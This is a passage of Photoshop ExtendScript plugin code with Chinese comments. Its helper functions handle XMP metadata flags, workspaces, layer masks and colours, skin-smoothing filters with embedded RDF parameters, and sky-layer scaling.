    try {
      if (typeof (iFile) != 'object') iFile = File(iFile);
      if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
      var xmpFile = new XMPFile(iFile.fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_READ | XMPConst.OPEN_USE_SMART_HANDLER);
      var xmp = xmpFile.getXMP();
      var isAlreadyApplied = xmp.getProperty(XMPConst.NS_CAMERA_RAW, "AlreadyApplied", XMPConst.BOOLEAN);
      return String(isAlreadyApplied) == 'false';
    } catch (e) { return !1 }
  },
  switchJpgXmp: function (iFile, iFlag) { //转换jpgXmp开关
    try {
      if (typeof (iFile) != 'object') iFile = File(iFile);
      if (ExternalObject.AdobeXMPScript == undefined) ExternalObject.AdobeXMPScript = new ExternalObject("lib:AdobeXMPScript");
      var xmpFile = new XMPFile(iFile.fsName, XMPConst.FILE_UNKNOWN, XMPConst.OPEN_FOR_UPDATE | XMPConst.OPEN_USE_SMART_HANDLER);
      var xmp = xmpFile.getXMP();
      var isAlreadyApplied = xmp.getProperty(XMPConst.NS_CAMERA_RAW, "AlreadyApplied", XMPConst.BOOLEAN);
      if (!iFlag && String(isAlreadyApplied) == 'false') {
        xmp.setProperty(XMPConst.NS_CAMERA_RAW, "AlreadyApplied", true);
        xmp.setProperty(XMPConst.NS_CAMERA_RAW, "jpgXmp", true); //写入修改标识
        if (xmpFile.canPutXMP(xmp)) xmpFile.putXMP(xmp);
      } else if (iFlag && String(isAlreadyApplied) == 'true') {
        var jpgXmp = xmp.getProperty(XMPConst.NS_CAMERA_RAW, "jpgXmp", XMPConst.BOOLEAN);
        if (String(jpgXmp) == 'true') { //如果被写入过才能修改
          xmp.setProperty(XMPConst.NS_CAMERA_RAW, "AlreadyApplied", false);
          xmp.setProperty(XMPConst.NS_CAMERA_RAW, "jpgXmp", false);
          if (xmpFile.canPutXMP(xmp)) xmpFile.putXMP(xmp);
        }
      }
      xmpFile.closeFile(XMPConst.CLOSE_UPDATE_SAFELY);
      return !0;
    } catch (e) { return !1 }
  },
  getDocList: function () { //获取PS文件列表
    var fileList = [];
    for (var i = 0; i < app.documents.length; i++) {
      try {
        var doc = app.documents[i];
        var docPath = doc.fullName.fsName;
        if (docPath) {
          fileList.push({
            file: docPath,//.toString().toLowerCase(),
            resolution: doc.resolution,
            saved: doc.saved,
            id: doc.id,
            width: doc.width.as('px'),
            height: doc.height.as('px')
          });
        }
      } catch (e) { }
    }
    return fileList;
  },
  getDocByPath: function (iPath) { //根据文件路径获取文档
    for (var i = 0; i < app.documents.length; i++) {
      try {
        var doc = app.documents[i];
        if (doc.fullName.fsName.toLowerCase() == File(File(iPath).fullName).fsName.toLowerCase())
          return doc;
      } catch (e) { }
    }
    return null;
  },
  getDocByName: function (iName) { //根据文件名称获取文档
    for (var i = 0; i < app.documents.length; i++) {
      try {
        var doc = app.documents[i];
        if (doc.name.toLowerCase() == iName.toLowerCase()) return doc;
      } catch (e) { }
    }
    return null;
  },
  getDocByID: function (id) { //根据文件ID获取文档
    for (var i = 0; i < app.documents.length; i++) {
      try {
        var doc = app.documents[i];
        if (doc.id == id) return doc;
      } catch (e) { }
    }
    return null;
  },
  setDocResolution: function (resolution) { //设置文档分辨率
    try {
      if (app.activeDocument.resolution == resolution) return !0;
      var desc1 = new ActionDescriptor();
      desc1.putUnitDouble(cTID('Rslt'), cTID('#Rsl'), resolution);
      app.executeAction(sTID('imageSize'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  linkMask: function (isLink) { //链接图层蒙板
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putBoolean(cTID('Usrs'), isLink);
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  rasterizeLayer: function () { //栅格化图层效果
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('rasterizeLayer'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  getUIScale: function () { //获取“缩放UI以适合字体”值
    var ref1 = new ActionReference();
    ref1.putProperty(cTID('Prpr'), sTID("interfacePrefs"));
    ref1.putEnumerated(cTID('capp'), cTID('Ordn'), cTID('Trgt'));
    return app.executeActionGet(ref1).getObjectValue(sTID("interfacePrefs")).getBoolean(sTID("paletteUIScaledTypeKey"));
  },
  listAllWorkspaces: function () { //获取工作区列表
    var ref = new ActionReference();
    Info = new Array();
    ref.putProperty(cTID("Prpr"), sTID("workspaceList"));
    ref.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
    var desc = app.executeActionGet(ref).getList(sTID("workspaceList"));
    for (var i = 0; i < desc.count; i++) {
      var workspace = desc.getObjectValue(i);
      Info.push({
        displayName: workspace.getString(sTID("displayName")),
        name: workspace.getString(sTID("name")),
        user: workspace.getBoolean(sTID("user"))
      });
    }
    return Info;
  },
  selWorkspace: function (iName) { //选择工作区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(sTID("workspace"), iName);
      desc1.putReference(cTID('null'), ref1);
      var desc = app.executeAction(sTID('select'), desc1, DialogModes.NO);
      return desc.count > 0;
    } catch (e) { return !1 }
  },
  saveWorkspace: function (iName) { //保存工作区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(sTID("workspace"));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putString(cTID('Nm  '), iName);
      desc2.putBoolean(cTID('Plt '), true);
      desc2.putBoolean(sTID("keyboardCustomization"), true);
      desc2.putBoolean(sTID("menuCustomization"), true);
      desc2.putBoolean(sTID("toolbarCustomization"), true);
      desc2.putBoolean(sTID("replace"), true);
      desc1.putObject(cTID('Usng'), sTID("workspace"), desc2);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  deleteWorkspace: function (iName) { //删除工作区
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(sTID("workspace"), iName);
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  resetWorkspace: function (iName) { //复位工作区
    try {
      this.selWorkspace(iName);
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(sTID("workspace"), iName);
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('reset'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  hideToolbar: function (isHide) { //隐藏/显示工具栏
    try {
      function getPalettes() {
        var ref = new ActionReference();
        ref.putProperty(sTID("property"), sTID("panelList"));
        ref.putEnumerated(sTID("application"), sTID("ordinal"), sTID("targetEnum"));
        var desc = app.executeActionGet(ref).getList(sTID("panelList"));
        var descCount = desc.count;
        for (var i = 0; i < descCount; i++) {
          if (desc.getObjectValue(i).getBoolean(sTID("visible")) == !0) return true;
        }
        return false;
      }
      // app.togglePalettes();
      var isPalettes = getPalettes();
      if (isHide == !0 && isPalettes == !1) app.togglePalettes();
      if (isHide == !1 && isPalettes == !0) app.togglePalettes();
      return !0;
    } catch (e) { return !1 }
  },
  setLayerColor: function (iColor) {  //设置图层颜色
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putEnumerated(cTID('Clr '), cTID('Clr '), sTID(iColor));
    desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
    app.executeAction(sTID('set'), desc1, DialogModes.NO);
  },
  getLayerColor: function (iName) { //获取图层颜色
    try {
      var ref = new ActionReference();
      ref.putProperty(cTID("Prpr"), cTID("Clr "));
      ref.putName(cTID("Lyr "), iName);
      var ret = app.executeActionGet(ref).getEnumerationValue(cTID("Clr "));
      return app.typeIDToStringID(ret);
    } catch (e) { return null }
  },
  getLayerKind: function (iName) { //获取图层类型
    try {
      return this.getLayerByName(iName).kind;
    } catch (e) { return !1 }
  },
  setMaskVisible: function (isVisible) { //设置蒙板是否可见
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putBoolean(cTID('UsrM'), isVisible);
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  plugGrind: function (heighten, isTransparent) { //插件式磨皮
    try {
      isTransparent = isTransparent == undefined ? 1 : isTransparent; //默认生成透明图层
      switch (heighten) {
        case "grain": var val1 = 10, val2 = 75, val3 = 10; break;
        case "blue": var val1 = 10, val2 = 75, val3 = 15; break;
        case "violet": var val1 = 20, val2 = 100, val3 = 20; break;
        case "none": var val1 = 0, val2 = 75, val3 = 0; break;
        default: var val1 = 10, val2 = 75, val3 = 15;
        //val1:力度10,10,20，val2:范围75,75,100，val3:锐化10,15,20
      }
      var desc1 = new ActionDescriptor();
      desc1.putInteger(1885622133, 1);
      desc1.putData(1885622903, '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Document rdf:about="" xmlns:nws="http://www.imagesinfo.org/PT/2.0/filter/"><nws:ID>1936028741</nws:ID><nws:Name><![CDATA[' + ']]' + '></nws:Name><nws:Group><![CDATA[' + ']]' + '></nws:Group><nws:Description><![CDATA[' + ']]' + '></nws:Description><nws:VM_1937012307><rdf:Seq><rdf:_1>-1,1936028741</rdf:_1></rdf:Seq></nws:VM_1937012307><nws:VM_2><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_2><nws:VM_1937012302><rdf:Seq><rdf:_1>-1,10</rdf:_1></rdf:Seq></nws:VM_1937012302><nws:VM_1937012303><rdf:Seq><rdf:_1>-1,16</rdf:_1></rdf:Seq></nws:VM_1937012303><nws:VM_1937012304><rdf:Seq><rdf:_1>-1,20</rdf:_1></rdf:Seq></nws:VM_1937012304><nws:VM_1937012290><rdf:Seq><rdf:_1>-1,' + val1 + '</rdf:_1></rdf:Seq></nws:VM_1937012290><nws:VM_1886670963><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670963><nws:VM_3><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_3><nws:VM_1886670195><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670195><nws:VM_1886670187><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886670187><nws:VM_1886670190><rdf:Seq><rdf:_1>-1,2</rdf:_1></rdf:Seq></nws:VM_1886670190><nws:VM_1886670194><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670194><nws:VM_1886671728><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671728><nws:VM_1886671736><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671736><nws:VM_1886671727><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1886671727><nws:VM_1886668919><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1886668919><nws:VM_1886671720><rdf:Seq><rdf:_1>-1,74</rdf:_1></rdf:Seq></nws:VM_1886671720><nws:VM_1886671731><rdf:Seq><rdf:_1>-1,50</rdf:_1></rdf:Seq></nws:VM_1886671731><nws:VM_1886671732><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1886671732><nws:VM_1886671730><rdf:Seq><rdf:_1>-1,' + val2 + '</rdf:_1></rdf:Seq></nws:VM_1886671730><nws:VM_1886671713><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671713><nws:VM_1886671982><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671982><nws:VM_4><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_4><nws:VM_1886668133><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886668133><nws:VM_1886668141><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886668141><nws:VM_1937012301><rdf:Seq><rdf:_1>-1,' + val3 + '</rdf:_1></rdf:Seq></nws:VM_1937012301><nws:VM_1919369836><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1919369836><nws:VM_1936995414><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995414><nws:VM_1886668917><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886668917><nws:VM_1936995416><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995416><nws:VM_1936995415><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995415><nws:VM_1886668901><rdf:Seq><rdf:_1>-1,50</rdf:_1></rdf:Seq></nws:VM_1886668901><nws:VM_5><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_5><nws:VM_1886670196><rdf:Seq><rdf:_1>-1,' + isTransparent + '</rdf:_1></rdf:Seq></nws:VM_1886670196><nws:VM_1885622133><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1885622133><nws:VM_1885621871><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1885621871><nws:VM_1885622132><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1885622132></rdf:Document></rdf:RDF>');
      desc1.putInteger(1885621871, 100);
      app.executeAction(sTID('8DAD2AE0-F80C-4596-9F1E-990717BB03BF'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  highSkin: function (heighten) { //高光磨皮
    switch (heighten) {
      case "grain": heighten = 5; break;//原8
      case "blue": heighten = 16; break;
      case "violet": heighten = 23; break;
      default: heighten = 5;
    }
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('pdOu'), 0);
      desc1.putData(cTID('pdRw'), '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Document rdf:about="" xmlns:nws="http://www.imagesinfo.org/PT/2.0/filter/"><nws:ID>1936028737</nws:ID><nws:Name><![CDATA[' + ']]' + '></nws:Name><nws:Group><![CDATA[' + ']]' + '></nws:Group><nws:Description><![CDATA[' + ']]' + '></nws:Description><nws:VM_1937012307><rdf:Seq><rdf:_1>-1,1936028737</rdf:_1></rdf:Seq></nws:VM_1937012307><nws:VM_2><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_2><nws:VM_1937012302><rdf:Seq><rdf:_1>-1,5</rdf:_1></rdf:Seq></nws:VM_1937012302><nws:VM_1937012303><rdf:Seq><rdf:_1>-1,6</rdf:_1></rdf:Seq></nws:VM_1937012303><nws:VM_1937012304><rdf:Seq><rdf:_1>-1,5</rdf:_1></rdf:Seq></nws:VM_1937012304><nws:VM_1937012290><rdf:Seq><rdf:_1>-1,' + heighten + '</rdf:_1></rdf:Seq></nws:VM_1937012290><nws:VM_1886670963><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670963><nws:VM_3><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_3><nws:VM_1886670195><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670195><nws:VM_1886670187><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886670187><nws:VM_1886670190><rdf:Seq><rdf:_1>-1,2</rdf:_1></rdf:Seq></nws:VM_1886670190><nws:VM_1886670194><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670194><nws:VM_1886671728><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671728><nws:VM_1886671736><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671736><nws:VM_1886671727><rdf:Seq><rdf:_1>-1,96</rdf:_1></rdf:Seq></nws:VM_1886671727><nws:VM_1886668919><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1886668919><nws:VM_1886671720><rdf:Seq><rdf:_1>-1,93</rdf:_1></rdf:Seq></nws:VM_1886671720><nws:VM_1886671731><rdf:Seq><rdf:_1>-1,44</rdf:_1></rdf:Seq></nws:VM_1886671731><nws:VM_1886671732><rdf:Seq><rdf:_1>-1,78</rdf:_1></rdf:Seq></nws:VM_1886671732><nws:VM_1886671730><rdf:Seq><rdf:_1>-1,40</rdf:_1></rdf:Seq></nws:VM_1886671730><nws:VM_1886671713><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671713><nws:VM_1886671982><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671982><nws:VM_4><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_4><nws:VM_1886668133><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886668133><nws:VM_1886668141><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886668141><nws:VM_1937012301><rdf:Seq><rdf:_1>-1,5</rdf:_1></rdf:Seq></nws:VM_1937012301><nws:VM_1919369836><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1919369836><nws:VM_1936995414><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995414><nws:VM_1886668917><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886668917><nws:VM_1936995416><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995416><nws:VM_1936995415><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995415><nws:VM_1886668901><rdf:Seq><rdf:_1>-1,50</rdf:_1></rdf:Seq></nws:VM_1886668901><nws:VM_5><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_5><nws:VM_1886670196><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670196><nws:VM_1885622133><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1885622133><nws:VM_1885621871><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1885621871><nws:VM_1885622132><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1885622132></rdf:Document></rdf:RDF>');
      desc1.putInteger(cTID('pdNo'), 100);
      app.executeAction(sTID('8DAD2AE0-F80C-4596-9F1E-990717BB03BF'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  darkSkin: function (heighten) { //暗部磨皮
    switch (heighten) {
      case "grain": heighten = 8; break;//原11
      case "blue": heighten = 21; break;
      case "violet": heighten = 29; break;
      default: heighten = 8;
    }
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('pdOu'), 0);
      desc1.putData(cTID('pdRw'), '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Document rdf:about="" xmlns:nws="http://www.imagesinfo.org/PT/2.0/filter/"><nws:ID>1936028737</nws:ID><nws:Name><![CDATA[' + ']]' + '></nws:Name><nws:Group><![CDATA[' + ']]' + '></nws:Group><nws:Description><![CDATA[' + ']]' + '></nws:Description><nws:VM_1937012307><rdf:Seq><rdf:_1>-1,1936028737</rdf:_1></rdf:Seq></nws:VM_1937012307><nws:VM_2><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_2><nws:VM_1937012302><rdf:Seq><rdf:_1>-1,5</rdf:_1></rdf:Seq></nws:VM_1937012302><nws:VM_1937012303><rdf:Seq><rdf:_1>-1,6</rdf:_1></rdf:Seq></nws:VM_1937012303><nws:VM_1937012304><rdf:Seq><rdf:_1>-1,5</rdf:_1></rdf:Seq></nws:VM_1937012304><nws:VM_1937012290><rdf:Seq><rdf:_1>-1,' + heighten + '</rdf:_1></rdf:Seq></nws:VM_1937012290><nws:VM_1886670963><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670963><nws:VM_3><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_3><nws:VM_1886670195><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670195><nws:VM_1886670187><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886670187><nws:VM_1886670190><rdf:Seq><rdf:_1>-1,2</rdf:_1></rdf:Seq></nws:VM_1886670190><nws:VM_1886670194><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670194><nws:VM_1886671728><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671728><nws:VM_1886671736><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671736><nws:VM_1886671727><rdf:Seq><rdf:_1>-1,96</rdf:_1></rdf:Seq></nws:VM_1886671727><nws:VM_1886668919><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1886668919><nws:VM_1886671720><rdf:Seq><rdf:_1>-1,113</rdf:_1></rdf:Seq></nws:VM_1886671720><nws:VM_1886671731><rdf:Seq><rdf:_1>-1,39</rdf:_1></rdf:Seq></nws:VM_1886671731><nws:VM_1886671732><rdf:Seq><rdf:_1>-1,45</rdf:_1></rdf:Seq></nws:VM_1886671732><nws:VM_1886671730><rdf:Seq><rdf:_1>-1,40</rdf:_1></rdf:Seq></nws:VM_1886671730><nws:VM_1886671713><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671713><nws:VM_1886671982><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886671982><nws:VM_4><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_4><nws:VM_1886668133><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886668133><nws:VM_1886668141><rdf:Seq><rdf:_1>-1,1</rdf:_1></rdf:Seq></nws:VM_1886668141><nws:VM_1937012301><rdf:Seq><rdf:_1>-1,5</rdf:_1></rdf:Seq></nws:VM_1937012301><nws:VM_1919369836><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1919369836><nws:VM_1936995414><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995414><nws:VM_1886668917><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886668917><nws:VM_1936995416><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995416><nws:VM_1936995415><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1936995415><nws:VM_1886668901><rdf:Seq><rdf:_1>-1,50</rdf:_1></rdf:Seq></nws:VM_1886668901><nws:VM_5><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_5><nws:VM_1886670196><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1886670196><nws:VM_1885622133><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1885622133><nws:VM_1885621871><rdf:Seq><rdf:_1>-1,100</rdf:_1></rdf:Seq></nws:VM_1885621871><nws:VM_1885622132><rdf:Seq><rdf:_1>-1,0</rdf:_1></rdf:Seq></nws:VM_1885622132></rdf:Document></rdf:RDF>');
      desc1.putInteger(cTID('pdNo'), 100);
      app.executeAction(sTID('8DAD2AE0-F80C-4596-9F1E-990717BB03BF'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  horizontalFlip: function () { //水平翻转
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      desc1.putEnumerated(cTID('Axis'), cTID('Ornt'), cTID('Hrzn'));
      app.executeAction(sTID('flip'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  placedLayerReplaceContents: function (iFile) { //更换链接对象文件
    try {
      var desc1 = new ActionDescriptor();
      desc1.putPath(cTID('null'), new File(iFile));
      app.executeAction(sTID('placedLayerReplaceContents'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  skyZoom: function (relink) { //天空缩放
    try {
      var doc = app.activeDocument;
      this.setMaskVisible(!1);
      var tmpBounds = doc.activeLayer.bounds;
      this.setMaskVisible(!0);
      var tmpWidth = (tmpBounds[2] - tmpBounds[0]).as('px');
      var tmpHeight = (tmpBounds[3] - tmpBounds[1]).as('px');
      var docWidth = doc.width.as('px');
      var docHeight = doc.height.as('px');
      if (docWidth > docHeight) {
        var tHeight = 100.0 * docHeight / tmpHeight;
        var tWidth = tHeight;
        var tPan = 0;
        if (tmpWidth * tWidth / 100 < docWidth) {
          tWidth = 100.0 * docWidth / tmpWidth;
          tHeight = tWidth;
          tPan = (docHeight - docWidth * tmpHeight / tmpWidth) / -2;
        }
      } else {
        var tHeight = 100.0 * docHeight / tmpHeight;
        var tWidth = tHeight;
        var iWidth = docHeight * tmpWidth / tmpHeight;
        var tPan = Math.round((docHeight - iWidth * tmpHeight / tmpWidth) / -2);
      }
      var desc1 = new ActionDescriptor();
      desc1.putEnumerated(cTID('FTcs'), cTID('QCSt'), sTID("QCSAverage"));
      // if (!relink) {
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Hrzn'), cTID('#Pxl'), 0);
      desc2.putUnitDouble(cTID('Vrtc'), cTID('#Pxl'), tPan);
      desc1.putObject(cTID('Ofst'), cTID('Ofst'), desc2);
      // }
      desc1.putUnitDouble(cTID('Wdth'), cTID('#Prc'), tWidth);
      desc1.putUnitDouble(cTID('Hght'), cTID('#Prc'), tHeight);
      app.executeAction(sTID('transform'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  selColorRange: function (iColor) { //获取一个颜色选区
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('Fzns'), 0);
      var desc2 = new ActionDescriptor();
      desc2.putDouble(cTID('Rd  '), iColor[0]);
      desc2.putDouble(cTID('Grn '), iColor[1]);
      desc2.putDouble(cTID('Bl  '), iColor[2]);
      desc1.putObject(cTID('Mnm '), cTID('RGBC'), desc2);
      // var desc3 = new ActionDescriptor();
      // desc3.putDouble(cTID('Rd  '), iColor[0]);
      // desc3.putDouble(cTID('Grn '), iColor[1]);
      // desc3.putDouble(cTID('Bl  '), iColor[2]);
      // desc1.putObject(cTID('Mxm '), cTID('RGBC'), desc3);
      desc1.putInteger(sTID("colorModel"), 0);
      app.executeAction(sTID('colorRange'), desc1, DialogModes.NO);
      return this.getSelectionBounds();
    } catch (e) { return !1 }
  },
  setColorSelect: function (iColor) { //设置一个颜色范围选区
    try {
      var desc1 = new ActionDescriptor();
      desc1.putInteger(cTID('Fzns'), 0);
      var desc2 = new ActionDescriptor();
      desc2.putDouble(cTID('Rd  '), iColor[0]);
      desc2.putDouble(cTID('Grn '), iColor[1]);
      desc2.putDouble(cTID('Bl  '), iColor[2]);
      desc1.putObject(cTID('Mnm '), cTID('RGBC'), desc2);
      var desc3 = new ActionDescriptor();
      desc3.putDouble(cTID('Rd  '), iColor[0]);
      desc3.putDouble(cTID('Grn '), iColor[1]);
      desc3.putDouble(cTID('Bl  '), iColor[2]);
      desc1.putObject(cTID('Mxm '), cTID('RGBC'), desc3);
      desc1.putInteger(sTID("colorModel"), 0);
      app.executeAction(sTID('colorRange'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  setFilterFXOpacity: function (iOpacity) { //设置智能滤镜不透明度
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putIndex(sTID("filterFX"), 1);
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      var desc3 = new ActionDescriptor();
      desc3.putUnitDouble(cTID('Opct'), cTID('#Prc'), iOpacity);
      desc3.putEnumerated(cTID('Md  '), cTID('BlnM'), cTID('Nrml'));
      desc2.putObject(sTID("blendOptions"), sTID("blendOptions"), desc3);
      desc1.putObject(sTID("filterFX"), sTID("filterFX"), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  editSelect: function (val) { //扩展/收缩选区
    try {
      var desc1 = new ActionDescriptor();
      desc1.putUnitDouble(cTID('By  '), cTID('#Pxl'), Math.abs(val));
      desc1.putBoolean(sTID("selectionModifyEffectAtCanvasBounds"), false);
